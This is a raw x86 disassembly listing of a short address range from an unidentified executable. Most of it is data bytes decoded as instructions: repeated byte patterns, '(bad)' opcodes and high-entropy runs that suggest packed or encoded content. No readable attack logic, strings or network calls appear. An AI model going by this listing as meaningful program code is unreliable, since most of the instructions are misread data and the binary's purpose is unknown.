  414981:	add    bh,ch
  414983:	or     esi,DWORD PTR [edx+0x3a4f710e]
  414989:	dec    edi
  41498a:	ja     0x4149db
  41498c:	cmp    eax,0x304f4f4f
  414991:	dec    edi
  414992:	jb     0x4149e3
  414994:	xor    ecx,DWORD PTR [edi+0x5e]
  414997:	dec    edi
  414998:	ss dec edi
  41499a:	jnp    0x4149eb
  41499c:	sub    DWORD PTR [edi+0x3a],ecx
  41499f:	dec    edi
  4149a0:	sub    cl,BYTE PTR [edi+0x1e]
  4149a3:	push   edx
  4149a4:	pop    ds
  4149a5:	push   ebx
  4149a6:	xor    DWORD PTR [edi+0x71],ecx
  4149a9:	dec    edi
  4149aa:	cmp    cl,BYTE PTR [edi+0x77]
  4149ad:	dec    edi
  4149ae:	cmp    eax,0x304f4f4f
  4149b3:	dec    edi
  4149b4:	jb     0x414a05
  4149b6:	xor    ecx,DWORD PTR [edi+0x5e]
  4149b9:	dec    edi
  4149ba:	ss dec edi
  4149bc:	popa   
  4149bd:	dec    edi
  4149be:	sub    DWORD PTR [edi+0x3a],ecx
  4149c1:	dec    edi
  4149c2:	sub    cl,BYTE PTR [edi+0x1e]
  4149c5:	bound  ebx,QWORD PTR [edi]
  4149c7:	arpl   WORD PTR [ecx],si
  4149c9:	dec    edi
  4149ca:	jno    0x414a1b
  4149cc:	cmp    cl,BYTE PTR [edi+0x6a]
  4149cf:	dec    edi
  4149d0:	cmp    eax,0x314f7b4f
  4149d5:	dec    edi
  4149d6:	dec    esp
  4149d7:	dec    edi
  4149d8:	xor    al,0x4f
  4149da:	cmp    cl,BYTE PTR [edi+0x28]
  4149dd:	dec    edi
  4149de:	push   ds
  4149df:	jb     0x414a00
  4149e1:	jae    0x4149f2
  4149e3:	add    DWORD PTR [eax],0xffffff80
  4149e6:	jo     0x414978
  4149e8:	jno    0x41497b
  4149ea:	aas    
  4149eb:	dec    edi
  4149ec:	jbe    0x414a3d
  4149ee:	cmp    cl,BYTE PTR [edi+0x76]
  4149f1:	dec    edi
  4149f2:	ds dec edi
  4149f4:	dec    esp
  4149f5:	dec    edi
  4149f6:	xor    DWORD PTR [edi+0x7b],ecx
  4149f9:	dec    edi
  4149fa:	xor    eax,0x364f3a4f
  4149ff:	dec    edi
  414a00:	push   ds
  414a01:	sbb    BYTE PTR [edi],0x83
  414a04:	setae  BYTE PTR [eax]
  414a07:	nop
  414a08:	jo     0x4149aa
  414a0a:	jno    0x4149ad
  414a0c:	aas    
  414a0d:	dec    edi
  414a0e:	jbe    0x414a5f
  414a10:	cmp    cl,BYTE PTR [edi+0x76]
  414a13:	dec    edi
  414a14:	ds dec edi
  414a16:	dec    esp
  414a17:	dec    edi
  414a18:	xor    DWORD PTR [edi+0x61],ecx
  414a1b:	dec    edi
  414a1c:	xor    eax,0x364f3a4f
  414a21:	dec    edi
  414a22:	push   ds
  414a23:	xchg   edx,eax
  414a24:	pop    ds
  414a25:	xchg   ebx,eax
  414a26:	bt     DWORD PTR [eax],eax
  414a29:	mov    al,ds:0xb171b070
  414a2e:	aas    
  414a2f:	dec    edi
  414a30:	pusha  
  414a31:	dec    edi
  414a32:	cmp    cl,BYTE PTR [edi+0x4e]
  414a35:	dec    edi
  414a36:	cmp    eax,0x314f7b4f
  414a3b:	dec    edi
  414a3c:	dec    ecx
  414a3d:	dec    edi
  414a3e:	xor    al,0x4f
  414a40:	cmp    cl,BYTE PTR [edi+0x36]
  414a43:	dec    edi
  414a44:	push   ds
  414a45:	mov    ds:0xb30fa31f,al
  414a4a:	add    BYTE PTR [eax-0x3e8e3f90],dh
  414a50:	aas    
  414a51:	dec    edi
  414a52:	pusha  
  414a53:	dec    edi
  414a54:	cmp    cl,BYTE PTR [edi+0x4e]
  414a57:	dec    edi
  414a58:	cmp    eax,0x314f704f
  414a5d:	dec    edi
  414a5e:	pop    edi
  414a5f:	dec    edi
  414a60:	xor    ecx,DWORD PTR [edi+0x3a]
  414a63:	dec    edi
  414a64:	xor    eax,0x1fb21e4f
  414a69:	mov    bl,0xf
  414a6b:	ret    
  414a6c:	add    al,al
  414a6e:	jo     0x414a40
  414a70:	jno    0x414a43
  414a72:	aas    
  414a73:	dec    edi
  414a74:	pusha  
  414a75:	dec    edi
  414a76:	cmp    cl,BYTE PTR [edi+0x4e]
  414a79:	dec    edi
  414a7a:	cmp    eax,0x314f6a4f
  414a7f:	dec    edi
  414a80:	dec    esi
  414a81:	dec    edi
  414a82:	xor    al,0x4f
  414a84:	cmp    cl,BYTE PTR [edi+0x28]
  414a87:	dec    edi
  414a88:	push   ds
  414a89:	ret    0xc31f
  414a8c:	psrlq  mm0,QWORD PTR [eax]
  414a8f:	shl    BYTE PTR [eax-0x20],1
  414a92:	jno    0x414a75
  414a94:	aas    
  414a95:	dec    edi
  414a96:	pusha  
  414a97:	dec    edi
  414a98:	cmp    cl,BYTE PTR [edi+0x4e]
  414a9b:	dec    edi
  414a9c:	cmp    eax,0x314f6b4f
  414aa1:	dec    edi
  414aa2:	dec    esp
  414aa3:	dec    edi
  414aa4:	xor    al,0x4f
  414aa6:	cmp    cl,BYTE PTR [edi+0x36]
  414aa9:	dec    edi
  414aaa:	push   ds
  414aab:	rcr    BYTE PTR [edi],cl
  414aad:	ror    DWORD PTR [edi],cl
  414aaf:	jecxz  0x414ab1
  414ab1:	loopne 0x414b23
  414ab3:	lock jno 0x414aa7
  414ab6:	aas    
  414ab7:	dec    edi
  414ab8:	ins    DWORD PTR es:[edi],dx
  414ab9:	dec    edi
  414aba:	cmp    cl,BYTE PTR [edi+0x5f]
  414abd:	dec    edi
  414abe:	cmp    eax,0x3e4f4a4f
  414ac3:	dec    edi
  414ac4:	cmp    cl,BYTE PTR [edi+0x3f]
  414ac7:	dec    edi
  414ac8:	push   ds
  414ac9:	loop   0x414aea
  414acb:	jecxz  0x414adc
  414acd:	repz add al,dh
  414ad0:	jo     0x414ad2
  414ad2:	jno    0x414ad5
  414ad4:	jo     0x414ae6
  414ad6:	jno    0x414ae9
  414ad8:	ds dec edi
  414ada:	jg     0x414b2b
  414adc:	cmp    cl,BYTE PTR [edi+0x53]
  414adf:	dec    edi
  414ae0:	cmp    al,0x4f
  414ae2:	push   0x4f
  414ae4:	ds dec edi
  414ae6:	dec    ebp
  414ae7:	dec    edi
  414ae8:	xor    ecx,DWORD PTR [edi+0x3a]
  414aeb:	dec    edi
  414aec:	xor    eax,0x1f021e4f
  414af1:	add    ecx,DWORD PTR [edi]
  414af3:	adc    eax,DWORD PTR [eax]
  414af5:	adc    BYTE PTR [eax+0x20],dh
  414af8:	jno    0x414b1b
  414afa:	aas    
  414afb:	dec    edi
  414afc:	add    BYTE PTR [eax],al
  414afe:	xchg   BYTE PTR [ecx+0x41],cl
  414b01:	add    BYTE PTR [edx+0x4b],bh
  414b04:	inc    ecx
  414b05:	add    BYTE PTR [edx-0x41ffbeb5],al
  414b0b:	dec    ebp
  414b0c:	inc    ecx
  414b0d:	add    BYTE PTR [esi],ah
  414b0f:	dec    ebp
  414b10:	inc    ecx
  414b11:	add    BYTE PTR [esi+0x6200414d],ch
  414b17:	dec    ebx
  414b18:	inc    ecx
  414b19:	add    BYTE PTR [esi+0x4b],ah
  414b1c:	inc    ecx
  414b1d:	add    BYTE PTR [esi-0x35ffbeb3],ah
  414b23:	dec    ebx
  414b24:	inc    ecx
  414b25:	add    BYTE PTR [ecx-0x49076357],dh
  414b2b:	mov    edx,0x4b7ef89c
  414b30:	inc    ecx
  414b31:	add    dh,bl
  414b33:	dec    esp
  414b34:	inc    ecx
  414b35:	add    dl,dh
  414b37:	dec    esp
  414b38:	inc    ecx
  414b39:	add    dh,bh
  414b3b:	dec    esp
  414b3c:	inc    ecx
  414b3d:	add    BYTE PTR [esi],cl
  414b3f:	dec    ebp
  414b40:	inc    ecx
  414b41:	add    BYTE PTR [esi-0x7dffbeb5],dh
  414b47:	dec    ecx
  414b48:	inc    ecx
  414b49:	add    dh,dl
  414b4b:	dec    ebx
  414b4c:	inc    ecx
  414b4d:	add    dh,al
  414b4f:	dec    ebx
  414b50:	inc    ecx
  414b51:	add    dl,al
  414b53:	dec    ebp
  414b54:	inc    ecx
  414b55:	add    BYTE PTR [esi],dh
  414b57:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  414b5e:	mov    cl,BYTE PTR [ebx+0x41]
  414b61:	add    BYTE PTR [eax-0x737ee9e4],bl
  414b67:	or     eax,0x705
  414b6c:	inc    eax
  414b6d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  414b71:	fstp   st(3)
  414b73:	inc    esp
  414b74:	inc    ebx
  414b75:	add    BYTE PTR [edx+0x68],dh
  414b78:	inc    ebp
  414b79:	inc    ecx
  414b7a:	mov    edx,?
  414b7c:	jne    0x414be0
  414b7e:	mov    ebp,gs
  414b80:	inc    BYTE PTR [edi]
  414b82:	mov    edi,0x7205a3fa
  414b87:	dec    ebx
  414b88:	inc    ecx
  414b89:	add    BYTE PTR [ecx],bh
  414b8b:	xchg   ebp,eax
  414b8c:	pushf  
  414b8d:	clc    
  414b8e:	cmp    DWORD PTR [esi-0x6ac70764],edx
  414b94:	pushf  
  414b95:	clc    
  414b96:	cmp    edx,DWORD PTR [ebp-0x6ac50764]
  414b9c:	pushf  
  414b9d:	clc    
  414b9e:	cmp    eax,0x3cf89c95
  414ba3:	xchg   ebp,eax
  414ba4:	pushf  
  414ba5:	clc    
  414ba6:	aas    
  414ba7:	xchg   ebp,eax
  414ba8:	pushf  
  414ba9:	clc    
  414baa:	ds xchg ebp,eax
  414bac:	pushf  
  414bad:	clc    
  414bae:	and    DWORD PTR [ebp-0x6ad90764],edx
  414bb4:	pushf  
  414bb5:	clc    
  414bb6:	jmp    0x4149:0x7a6003f9
  414bbd:	add    BYTE PTR [edi+ecx*1+0x49590043],dh
  414bc4:	imul   si,WORD PTR [esi],0xff85
  414bc8:	pushf  
  414bc9:	clc    
  414bca:	popf   
  414bcb:	jmp    0xac75320
  414bd0:	add    BYTE PTR [eax],al
  414bd2:	jbe    0x414c1d
  414bd4:	inc    ecx
  414bd5:	add    BYTE PTR [ebx+0xe040b],bl
	...
  414c0b:	adc    BYTE PTR [eax+0x0],al
  414c0e:	fcomp  DWORD PTR [edi]
  414c10:	inc    ebx
  414c11:	add    BYTE PTR [eax],al
  414c13:	add    BYTE PTR [eax],al
  414c15:	add    BYTE PTR [ecx+0x0],cl
  414c18:	inc    esp
  414c19:	add    BYTE PTR [ecx+0x0],ch
  414c1c:	add    BYTE PTR fs:[ebx+0x0],cl
  414c20:	dec    edx
  414c21:	add    BYTE PTR [ebx+0x0],cl
  414c24:	dec    edx
  414c25:	add    BYTE PTR [eax+eax*1+0x6b],al
  414c29:	add    BYTE PTR [eax+eax*1+0x6a],ch
  414c2d:	add    BYTE PTR [eax+eax*1+0x4c],al
  414c31:	add    BYTE PTR [ecx+0x0],cl
  414c34:	inc    esp
  414c35:	add    BYTE PTR [eax+eax*1+0x49],cl
  414c39:	add    BYTE PTR [ebp+0x0],dl
  414c3c:	dec    edx
  414c3d:	add    BYTE PTR [ebx+0x0],cl
  414c40:	inc    esp
  414c41:	add    BYTE PTR [eax+eax*1+0x4a],cl
  414c45:	add    BYTE PTR [ebx+0x0],cl
  414c48:	dec    eax
  414c49:	add    BYTE PTR [eax+eax*1+0x4a],al
	...
  414c55:	add    BYTE PTR [ebx+ebp*2+0x6a],ah
  414c59:	jae    0x414cc6
  414c5b:	ins    BYTE PTR es:[edi],dx
  414c5c:	popa   
  414c5d:	imul   ebp,DWORD PTR [edx+ebp*2+0x4c],0x4b
  414c62:	dec    ecx
  414c63:	dec    edx
  414c64:	inc    esp
  414c65:	inc    esi
  414c66:	ins    BYTE PTR es:[edi],dx
  414c67:	imul   ebp,DWORD PTR [ebx+0x75],0x736c6466
  414c6e:	imul   ebp,DWORD PTR [ecx+0x68],0x67
  414c72:	ins    BYTE PTR es:[edi],dx
  414c73:	jae    0x414ce0
  414c75:	push   0x66
  414c77:	ins    BYTE PTR es:[edi],dx
  414c78:	imul   ecx,DWORD PTR [edx+0x4b],0x44
  414c7c:	imul   sp,WORD PTR [esi+eiz*2+0x68],0x73
  414c82:	imul   esp,DWORD PTR [edi+0x66],0x68
  414c86:	jae    0x414cec
  414c88:	imul   esi,DWORD PTR [ebp+0x6b],0x64756679
  414c8f:	imul   esi,DWORD PTR [ebx+0x6b],0x486a6b68
  414c96:	dec    ebx
  414c97:	dec    edx
  414c98:	inc    esp
  414c99:	inc    esi
  414c9a:	push   0x756b7364
  414c9f:	outs   dx,DWORD PTR ds:[si]
  414ca1:	imul   esi,DWORD PTR [ebx+0x66],0x6b677564
  414ca8:	push   0x66
  414caa:	fs jae 0x414d15
  414cad:	imul   ebp,DWORD PTR [si+0x66],0x68
  414cb2:	ins    BYTE PTR es:[edi],dx
  414cb3:	imul   esp,DWORD PTR [edi+0x6a],0x75
  414cb7:	push   0x6a6b6466
  414cbc:	jne    0x414d25
  414cbe:	jns    0x414d24
  414cc0:	imul   si,WORD PTR [di+0x66],0x6764
  414cc7:	jne    0x414d35
  414cc9:	fs pushw 0x6c67
  414cce:	push   0x68
  414cd0:	data16 add BYTE PTR fs:[eax],al
  414cd4:	add    BYTE PTR [eax],al
  414cd6:	add    BYTE PTR [eax],al
  414cd8:	add    BYTE PTR [eax],al
  414cda:	xor    edx,DWORD PTR [ebx]
  414cdc:	inc    ecx
  414cdd:	add    BYTE PTR [ebp+0x4f],dl
  414ce0:	pop    edi
  414ce1:	dec    edi
  414ce2:	dec    esp
  414ce3:	dec    edi
  414ce4:	dec    eax
  414ce5:	dec    edi
  414ce6:	pop    edi
  414ce7:	dec    edi
  414ce8:	push   esi
  414ce9:	dec    edi
  414cea:	or     eax,0x3a4f0c4f
  414cef:	dec    edi
  414cf0:	add    BYTE PTR [eax],al
  414cf2:	push   ecx
  414cf3:	dec    edi
  414cf4:	pop    esi
  414cf5:	dec    edi
  414cf6:	push   ebx
  414cf7:	dec    edi
  414cf8:	or     eax,0x3a4f0c4f
  414cfd:	dec    edi
  414cfe:	dec    edi
  414cff:	dec    edi
  414d00:	dec    ebp
  414d01:	dec    edi
  414d02:	pop    edi
  414d03:	dec    edi
  414d04:	dec    esp
  414d05:	dec    edi
  414d06:	or     eax,0x3a4f0c4f
  414d0b:	dec    edi
  414d0c:	add    BYTE PTR [eax],al
  414d0e:	dec    ebp
  414d0f:	dec    edi
  414d10:	push   edx
  414d11:	dec    edi
  414d12:	push   esi
  414d13:	dec    edi
  414d14:	inc    ecx
  414d15:	dec    edi
  414d16:	pop    ebx
  414d17:	dec    edi
  414d18:	dec    edx
  414d19:	dec    edi
  414d1a:	push   ebx
  414d1b:	dec    edi
  414d1c:	cmp    cl,BYTE PTR [edi+0x0]
  414d1f:	add    BYTE PTR [eax],al
  414d21:	add    BYTE PTR [eax],al
  414d23:	add    BYTE PTR [eax],al
  414d25:	add    BYTE PTR [esi+0x7d],ch
  414d28:	outs   dx,BYTE PTR ds:[esi]
  414d29:	lea    ebp,[esi-0x63]
  414d2c:	outs   dx,BYTE PTR ds:[esi]
  414d2d:	lods   eax,DWORD PTR ds:[esi]
  414d2e:	outs   dx,BYTE PTR ds:[esi]
  414d2f:	mov    ebp,0xdd6ecd6e
  414d34:	outs   dx,BYTE PTR ds:[esi]
  414d35:	in     eax,dx
  414d36:	outs   dx,BYTE PTR ds:[esi]
  414d37:	std    
  414d38:	outs   dx,BYTE PTR ds:[esi]
  414d39:	or     eax,0x2d6e1d6e
  414d3e:	outs   dx,BYTE PTR ds:[esi]
  414d3f:	cmp    eax,0x6d6e5d6e
  414d44:	outs   dx,BYTE PTR ds:[esi]
  414d45:	jb     0x414db5
  414d47:	jae    0x414db7
  414d49:	jo     0x414db9
  414d4b:	jno    0x414dbb
  414d4d:	jbe    0x414dbd
  414d4f:	ja     0x414dbf
  414d51:	je     0x414dc1
  414d53:	jne    0x414dc3
  414d55:	mov    ch,BYTE PTR [esi-0x75]
  414d58:	outs   dx,BYTE PTR ds:[esi]
  414d59:	mov    BYTE PTR [esi-0x77],ch
  414d5c:	outs   dx,BYTE PTR ds:[esi]
  414d5d:	mov    gs,WORD PTR [esi+0x7c]
  414d60:	pop    esi
  414d61:	jge    0x414db1
  414d63:	jge    0x414d23
  414d65:	jge    0x414db7
  414d67:	(bad)  
  414d68:	jno    0x414dda
  414d6a:	mov    cl,0xb1
  414d6c:	outs   dx,BYTE PTR ds:[esi]
  414d6d:	jae    0x414dec
  414d6f:	bound  esp,QWORD PTR [edx+0x7c265fc6]
  414d75:	add    BYTE PTR [ecx+0x17],al
  414d78:	mov    bl,0x56
  414d7a:	mov    cl,0xf4
  414d7c:	inc    edx
  414d7d:	aaa    
  414d7e:	inc    edx
  414d7f:	jle    0x414d12
  414d81:	jno    0x414ddb
  414d83:	mov    cl,0x4
  414d85:	imul   esp,DWORD PTR [eax-0x70282bf8],0x5
  414d8c:	inc    esp
  414d8d:	xlat   BYTE PTR ds:[ebx]
  414d8e:	leave  
  414d8f:	xchg   ebx,eax
  414d90:	inc    eax
  414d91:	adc    eax,ecx
  414d93:	jge    0x414d60
  414d95:	faddp  st(7),st
  414d97:	leave  
  414d98:	xchg   BYTE PTR [esi+0x1fa23208],ah
  414d9e:	fs icebp 
  414da0:	dec    eax
  414da1:	(bad)  
  414da2:	leave  
  414da3:	sbb    cl,cl
  414da5:	jno    0x414d93
  414da7:	(bad)  [ebx+0x7]
  414daa:	ror    BYTE PTR [ebx+0x41],cl
  414dad:	add    BYTE PTR [ebp+0x2f],al
  414db0:	shl    BYTE PTR [edx],0x2c
  414db3:	xor    eax,DWORD PTR [ecx+0x0]
  414db6:	inc    esi
  414db7:	push   ebx
  414db8:	outs   dx,DWORD PTR ds:[esi]
  414db9:	push   ebx
  414dba:	push   0x4b
  414dbc:	inc    ecx
  414dbd:	add    dh,cl
  414dbf:	dec    ebx
  414dc0:	inc    ecx
  414dc1:	add    BYTE PTR [ebp+ebp*8+0x712],cl
	...
  414de4:	add    BYTE PTR [eax],al
  414de6:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  414ded:	pop    ecx
  414dee:	outs   dx,BYTE PTR ds:[esi]
  414def:	jbe    0x414e69
  414df1:	jns    0x414e47
  414df3:	push   ecx
  414df4:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  414df8:	je     0x414e5b
	...
  414e0e:	jp     0x414e64
  414e10:	arpl   WORD PTR [ecx+0x4b],cx
  414e13:	push   edx
  414e14:	imul   ebp,DWORD PTR [eax+0x53],0x4746536f
  414e1b:	push   0x66495949
  414e20:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  414e24:	push   esi
  414e25:	jb     0x414e8f
  414e27:	add    BYTE PTR [ebx+0x51],al
  414e2a:	ins    BYTE PTR es:[edi],dx
  414e2b:	pop    eax
  414e2c:	ja     0x414e7b
  414e2e:	je     0x414ea6
  414e30:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  414e34:	in     al,0xf5
  414e36:	jnp    0x414e86
  414e38:	jnp    0x414e08
  414e3a:	cmc    
  414e3b:	push   DWORD PTR [ebx]
  414e3d:	sar    ebx,cl
  414e3f:	fnstenv [ebp+0xd]
  414e42:	daa    
  414e43:	fs mov ebp,fs
  414e46:	add    BYTE PTR [eax],al
  414e48:	test   BYTE PTR [eax],0x0
  414e4b:	add    BYTE PTR [esi],bh
  414e4d:	aam    0xf9
  414e4f:	pop    eax
  414e50:	xchg   ebx,eax
  414e51:	xor    esi,DWORD PTR [edx-0x4c2fa8b5]
  414e57:	int3   
  414e58:	pop    esp
  414e59:	ins    DWORD PTR es:[edi],dx
  414e5a:	fimul  WORD PTR [edi]
  414e5c:	inc    eax
  414e5d:	push   edi
  414e5e:	and    cl,BYTE PTR [ecx]
  414e60:	pop    ss
  414e61:	adc    DWORD PTR [esi-0x5824a9b0],0x62
  414e68:	inc    esi
  414e69:	push   0x7a
  414e6b:	loop   0x414e8d
  414e6d:	bound  esi,QWORD PTR [edi+0x34089df7]
  414e73:	shl    ah,1
  414e75:	jp     0x414eee
  414e77:	push   edx
  414e78:	out    0x81,al
  414e7a:	(bad)  [ecx+edx*8-0x23]
  414e7e:	cmc    
  414e7f:	push   DWORD PTR [ecx+0x640dc359]
  414e85:	jns    0x414efa
  414e87:	lea    edi,[esi+edx*1-0x71f5c478]
  414e8e:	dec    ebp
  414e8f:	and    ecx,0x12
  414e92:	mov    edx,edi
  414e94:	push   esp
  414e95:	inc    esi
  414e96:	aam    0xa9
  414e98:	enter  0x4202,0xa4
  414e9c:	loopne 0x414ea0
  414e9e:	sbb    BYTE PTR [ebp+0x28dbac52],bl
  414ea4:	and    eax,0xe59c1014
  414ea9:	ja     0x414eac
  414eab:	jo     0x414e88
  414ead:	xchg   ebp,eax
  414eae:	fdiv   QWORD PTR [edi-0x690175dd]
  414eb4:	add    ch,BYTE PTR [edi-0x36]
  414eb7:	jecxz  0x414f30
  414eb9:	jmp    0x44e:0xa9d79af5
  414ec0:	push   eax
  414ec1:	mov    ch,0x1b
  414ec3:	add    ebx,DWORD PTR [esi-0x77]
  414ec6:	pop    eax
  414ec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ec8:	and    DWORD PTR [esi],esi
  414eca:	xchg   esi,eax
  414ecb:	sti    
  414ecc:	int    0x6d
  414ece:	add    DWORD PTR [ebp*2+0x78c3723e],edx
  414ed5:	sbb    al,0x40
  414ed7:	imul   DWORD PTR [eax-0x1a7eab60]
  414edd:	lahf   
  414ede:	cmp    al,0xa6
  414ee0:	ins    DWORD PTR es:[edi],dx
  414ee1:	cmp    al,BYTE PTR [edi+ebx*1]
  414ee4:	sub    esi,DWORD PTR [esi+0x4ada54c4]
  414eea:	adc    eax,0x9d56a2c2
  414eef:	out    0xb5,eax
  414ef1:	nop
  414ef2:	and    BYTE PTR [ecx+0x2531c848],0x73
  414ef9:	pop    esi
  414efa:	out    dx,al
  414efb:	cs fcmovbe st,st(4)
  414efe:	push   es
  414eff:	mov    BYTE PTR [esi+0x12],dl
  414f02:	add    eax,0x8faac58d
  414f07:	adc    BYTE PTR [ebx+ebp*4],bh
  414f0a:	sti    
  414f0b:	jmp    0x1105f644
  414f10:	dec    ebx
  414f11:	jmp    0x5f19bb71
  414f16:	push   ss
  414f17:	push   edi
  414f18:	jmp    0x414f4d
  414f1a:	and    dl,dh
  414f1c:	mov    edx,0x5f09c48b
  414f21:	rcr    BYTE PTR [ecx+0x275e0f10],1
  414f27:	adc    ax,0x2eb2
  414f2b:	rcl    BYTE PTR [esi+0x5c],0xd2
  414f2f:	shl    BYTE PTR [ebx+0x3632b05f],1
  414f35:	fwait
  414f36:	adc    al,0x1f
  414f38:	(bad)  
  414f39:	(bad)  
  414f3a:	xor    BYTE PTR [eax],al
  414f3c:	push   0xffffffee
  414f3e:	fst    DWORD PTR [ebx+0xb9ca]
	...
  414fb4:	pop    edx
  414fb5:	ficom  DWORD PTR [esi+0x60]
  414fb8:	(bad)  
  414fb9:	in     al,dx
  414fba:	jle    0x414fb6
  414fbc:	cs pop ebx
  414fbe:	pop    ss
  414fbf:	ret    0x7e16
  414fc2:	jno    0x414f45
  414fc4:	and    dh,0x0
  414fc7:	add    dh,dh
  414fc9:	add    BYTE PTR [eax],al
  414fcb:	add    dl,ah
  414fcd:	call   DWORD PTR [ecx-0x17]
  414fd0:	cmp    dh,cl
  414fd2:	or     ebx,DWORD PTR [esi-0x2f]
  414fd5:	stos   DWORD PTR es:[edi],eax
  414fd6:	push   ds
  414fd7:	mov    esi,0xbcb8aa62
  414fdc:	jmp    0xe5b9ec4e
  414fe1:	(bad)  
  414fe2:	sub    esp,DWORD PTR [eax]
  414fe4:	out    dx,al
  414fe5:	jmp    0xe5b8:0x5c8684f1
  414fec:	push   ss
  414fed:	shr    DWORD PTR [ebp-0x43faa147],1
  414ff3:	ins    BYTE PTR es:[edi],dx
  414ff4:	(bad)  
  414ff5:	out    0xdc,al
  414ff7:	stos   DWORD PTR es:[edi],eax
  414ff8:	or     ebp,DWORD PTR [eax+0x7f]
  414ffb:	push   esi
  414ffc:	or     bl,dh
  414ffe:	out    dx,al
  414fff:	mov    ebp,eax
  415001:	pop    eax
  415002:	inc    eax
  415003:	nop
  415004:	ds dec ebp
  415006:	xor    DWORD PTR [ebx+0x6b],0x9c29099d
  41500d:	mov    bh,0x70
  41500f:	jmp    0x8bafb157
  415014:	xchg   ecx,eax
  415015:	push   ebx
  415016:	push   eax
  415017:	or     dh,al
  415019:	dec    ebp
  41501a:	pop    ecx
  41501b:	fcom   st(4)
  41501d:	dec    esi
  41501e:	loope  0x41507a
  415020:	cmp    al,0xd9
  415022:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415023:	cmp    DWORD PTR [esp+ecx*8-0x16],0xe50fb998
  41502b:	ins    DWORD PTR es:[edi],dx
  41502c:	xor    al,0x6a
  41502e:	push   ebx
  41502f:	lahf   
  415030:	enter  0xf5ee,0x81
  415034:	inc    eax
  415035:	add    eax,0xef8674d8
  41503a:	sub    al,0x16
  41503c:	lahf   
  41503d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41503e:	mov    esp,0xea7413b3
  415043:	xchg   ebp,eax
  415044:	mov    dh,0xfa
  415046:	cmp    DWORD PTR [eax],0x7aa2bdf4
  41504c:	sti    
  41504d:	xchg   esp,eax
  41504e:	loopne 0x415025
  415050:	scas   al,BYTE PTR es:[edi]
  415051:	mov    ebx,0x3c11ccfe
  415056:	dec    ecx
  415057:	sub    ch,BYTE PTR [edx]
  415059:	imul   BYTE PTR [ecx]
  41505b:	pop    eax
  41505c:	xor    esp,esp
  41505e:	mov    bh,0x66
  415060:	loopne 0x414fe5
  415062:	xor    eax,0xe3dfa052
  415067:	ss dec ebx
  415069:	pop    eax
  41506a:	call   0x2193:0x98e18e73
  415071:	imul   esi,DWORD PTR [edx],0xbadf8074
  415077:	(bad)  
  415078:	mov    al,ds:0xea6840db
  41507d:	mov    ebx,edx
  41507f:	aad    0x91
  415081:	sar    BYTE PTR [edi],0x75
  415084:	mov    dh,cl
  415086:	push   DWORD PTR [ebp+0x16]
  415089:	inc    ebp
  41508a:	ret    
  41508b:	nop
  41508c:	shr    DWORD PTR [edx],1
  41508e:	out    0x51,eax
  415090:	scas   eax,DWORD PTR es:[edi]
  415091:	push   ebx
  415092:	test   eax,0xeb97bd94
  415097:	outs   dx,BYTE PTR ds:[esi]
  415098:	or     edi,edi
  41509a:	pop    ebp
  41509b:	mov    ecx,0x564dc92f
  4150a0:	dec    esp
  4150a1:	xchg   BYTE PTR [di+0x16],bl
  4150a5:	xchg   esp,eax
  4150a6:	mov    BYTE PTR [ecx-0x2b],bh
  4150a9:	aas    
  4150aa:	xor    dh,cl
  4150ac:	mov    ecx,DWORD PTR [esi+0x13]
  4150af:	jg     0x4150a7
  4150b1:	call   0xaad046e8
  4150b6:	scas   eax,DWORD PTR es:[edi]
  4150b7:	add    DWORD PTR [esi+0x19],edx
  4150ba:	repnz fisubr WORD PTR [ebx+0x75]
  4150be:	push   0x7a
  4150c0:	adc    DWORD PTR [eax+0x0],0x0
	...
  415133:	add    BYTE PTR [edx],al
  415135:	adc    al,BYTE PTR [ecx]
  415137:	mov    ds:0xb3a2b311,eax
  41513c:	adc    ah,BYTE PTR [esi-0x60f33b27]
  415142:	fdivr  QWORD PTR gs:[eax-0x19]
  415146:	add    BYTE PTR [eax],al
  415148:	test   BYTE PTR [eax],0x0
  41514b:	add    BYTE PTR [ebx+0x24b783fd],cl
  415151:	inc    esi
  415152:	dec    esp
  415153:	les    ecx,FWORD PTR [ebx-0x326a992a]
  415159:	bndstx [ecx+0x62ab69a5],(bad)
  415160:	out    0xdb,al
  415162:	xchg   dh,ah
  415164:	mov    ebx,edx
  415166:	pop    edi
  415167:	push   edx
  415168:	adc    ah,BYTE PTR [ebp+0x138f20d4]
  41516e:	in     eax,0x19
  415170:	outs   dx,BYTE PTR ds:[esi]
  415171:	js     0x415148
  415173:	lea    eax,[esi]
  415175:	push   esi
  415176:	mov    cl,0x7a
  415178:	in     eax,dx
  415179:	jae    0x4151d2
  41517b:	push   esi
  41517c:	fld    QWORD PTR [edi]
  41517e:	cmp    al,dh
  415180:	dec    ebp
  415181:	lahf   
  415182:	sbb    eax,0x858b2813
  415187:	loope  0x415122
  415189:	in     eax,dx
  41518a:	mov    al,0x78
  41518c:	cmp    ecx,DWORD PTR [esi+ecx*2]
  41518f:	jmp    0xa1b86b2b
  415194:	call   0xae6b:0x80c62811
  41519b:	xchg   BYTE PTR [ebx+0x78d94128],al
  4151a1:	mov    al,0x53
  4151a3:	int    0x7a
  4151a5:	jbe    0x4151a5
  4151a7:	push   edx
  4151a8:	scas   al,BYTE PTR es:[edi]
  4151a9:	mov    ecx,DWORD PTR [ebx+0x52a14568]
  4151af:	dec    ebp
  4151b0:	repnz adc eax,ebp
  4151b3:	xlat   BYTE PTR ds:[ebx]
  4151b4:	jno    0x415191
  4151b6:	cs (bad) 
  4151b8:	retf   
  4151b9:	mov    esp,0x587320d5
  4151be:	mov    dh,0xbd
  4151c0:	mov    ds:0xb9fbf029,al
  4151c5:	fadd   QWORD PTR [edi-0x3c905b49]
  4151cb:	adc    al,0xb2
  4151cd:	and    eax,0x7722d537
  4151d2:	jne    0x4151d9
  4151d4:	or     DWORD PTR [ecx-0x3717cefd],ebp
  4151da:	mov    ch,ah
  4151dc:	mov    esi,0xa13a905d
  4151e1:	mov    dl,0x71
  4151e3:	dec    edx
  4151e4:	les    ebp,FWORD PTR [ecx+0x49]
  4151e7:	call   0x1c47:0x9891f1bd
  4151ee:	push   eax
  4151ef:	adc    ecx,DWORD PTR [eax]
